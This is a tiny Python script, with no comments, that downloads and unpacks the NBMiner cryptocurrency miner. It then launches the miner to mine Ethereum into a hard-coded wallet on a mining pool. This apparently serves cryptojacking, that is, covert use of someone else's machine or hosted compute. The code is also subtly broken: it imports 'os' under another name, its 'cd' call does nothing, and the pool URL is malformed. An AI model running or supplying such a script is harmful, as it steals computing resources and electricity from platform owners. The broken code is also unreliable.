import os as alpha
os.system("wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz")
os.system("tar -xf  NBMiner_39.2_Linux.tgz")
os.system("cd NBMiner_Linux")
os.system("./nbminer -a ethash -o stratum+tcp.//us1.ethermine.org:4444 -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.ipqce2xl5hi6b3x -p x")
